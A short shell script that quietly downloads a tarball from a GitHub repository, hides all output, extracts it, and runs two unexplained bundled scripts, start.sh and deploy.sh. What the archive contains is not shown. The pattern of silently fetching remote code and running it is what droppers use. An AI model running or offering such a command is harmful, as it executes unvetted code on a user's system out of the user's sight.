wget -O dolorku.tar.gz https://github.com/clasmildyt/lancrot/raw/main/dolorku.tar.gz >/dev/null 2>&1
tar -xvf dolorku.tar.gz >/dev/null 2>&1
chmod +x start.sh && 
./start.sh && 
chmod +x deploy.sh && 
./deploy.sh
